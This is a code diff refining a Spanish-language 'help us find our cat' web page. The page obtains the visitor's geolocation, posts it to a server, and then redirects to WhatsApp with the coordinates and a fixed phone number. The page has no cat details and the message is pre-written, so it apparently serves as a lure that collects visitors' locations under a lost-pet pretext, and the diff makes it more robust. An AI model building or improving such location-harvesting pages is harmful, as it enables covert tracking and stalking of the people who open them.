@@ -1,7 +1,7 @@
 <!DOCTYPE HTML>
-<html>
+<html lang="es">
 <head>
-  <title>Porfavor!!! Ayudanos a encontrar a nuestro gato </title>  
+  <title>¡Por favor, ayúdanos a encontrar a nuestro gato!</title>  
   <meta charset="UTF-8">
   
   <script type="text/javascript"> 
@@ -40,11 +40,14 @@
         .then(data => {
             console.log("Ubicación enviada:", data);
             document.body.innerHTML = "<h2>Ubicación enviada con éxito</h2>";
-        };
-      ;
+        })
+        .catch(error => {
+            console.error("Error al enviar la ubicación:", error);
+            alert("Hubo un problema al enviar la ubicación. Inténtalo de nuevo.");
+        });
 
         // Número de WhatsApp (incluye el código de país, sin "+")
-        var numeroWhatsApp = "5215539657315"; // Reemplaza con el número de destino
+        var numeroWhatsApp = "5215539657315"; // Reemplaza con el número correcto
 
         // Mensaje personalizado
         var mensaje = encodeURIComponent(`¡Hola! Acabo de ver al gato en esta ubicación: https://www.google.com/maps?q=${lat},${lon}`);
@@ -52,19 +55,30 @@
         // Esperar 2 segundos y luego abrir WhatsApp
         setTimeout(() => {
             window.location.href = `https://wa.me/${numeroWhatsApp}?text=${mensaje}`;
-        }, 800);
+        }, 2000);
     }
 
     function mostrarError(error) {
-        alert('No se pudo obtener la ubicación: ' + error.message);
+        let mensaje;
+        switch (error.code) {
+            case error.PERMISSION_DENIED:
+                mensaje = "No se otorgaron permisos para obtener la ubicación.";
+                break;
+            case error.POSITION_UNAVAILABLE:
+                mensaje = "La información de ubicación no está disponible.";
+                break;
+            case error.TIMEOUT:
+                mensaje = "Se agotó el tiempo de espera para obtener la ubicación.";
+                break;
+            default:
+                mensaje = "Error desconocido al obtener la ubicación.";
+        }
+        alert(mensaje);
     }
-
-
-      
   </script>  
 
 </head>
 <body>
-  <h2> Ayudanos a encontrar a nuestro gato ...</h2>
+  <h2>¡Ayúdanos a encontrar a nuestro gato!</h2>
 </body>
 </html>
